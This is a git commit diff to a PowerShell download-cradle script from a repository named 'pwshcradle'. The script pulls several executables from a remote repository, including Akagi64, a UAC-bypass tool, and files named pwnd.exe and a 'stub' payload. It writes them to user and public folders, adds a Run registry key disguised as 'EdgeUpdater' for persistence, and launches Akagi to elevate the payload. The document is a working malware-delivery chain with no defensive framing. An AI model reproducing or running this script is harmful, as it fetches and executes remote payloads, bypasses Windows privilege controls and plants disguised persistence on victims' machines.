a5832e825bf85476346eace4a0850281f4309a5e
Brothersextremegaming <125992368+Brothersextremegaming@users.noreply.github.com>
2026-02-24 11:55:45 +0530

    11:55

--- cradle.ps1
+++ cradle.ps1
@@ -1,12 +1,12 @@
-Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/pwnd.exe" -OutFile $env:USERPROFILE\Documents\demo.exe
+Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/pwnd.exe" -OutFile "$env:USERPROFILE\Documents\demo.exe"
 
-Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe" -OutFile $env:USERPROFILE\Documents\Akagi.exe
+Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe" -OutFile "$env:USERPROFILE\Documents\Akagi.exe"
 
-Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe" -OutFile C:\Users\Public\Akagi.exe
+Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe" -OutFile "C:\Users\Public\Akagi.exe"
 
-Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/stub_recipent.exe" -OutFile C:\Users\Public\demo.exe
+Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/stub_recipient.exe" -OutFile "C:\Users\Public\demo.exe"
 
-Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/p.exe" -OutFile C:\Users\Public\p.exe
+Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/p.exe" -OutFile "C:\Users\Public\p.exe"
 
 $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $AppName = "EdgeUpdater"
@@ -16,5 +16,7 @@ If (-not (Test-Path $RegPath)) { New-Item -Path $RegPath -Force | Out-Null }
 New-ItemProperty -Path $RegPath -Name $AppName -Value "`"$ExePath`"" -PropertyType String -Force | Out-Null
 
 
-$env:USERPROFILE\Documents\Akagi.exe 62 $env:USERPROFILE\Documents\demo.exe
+cd "$env:USERPROFILE\Documents"
+
+.\Akagi.exe 62 .\demo.exe
 
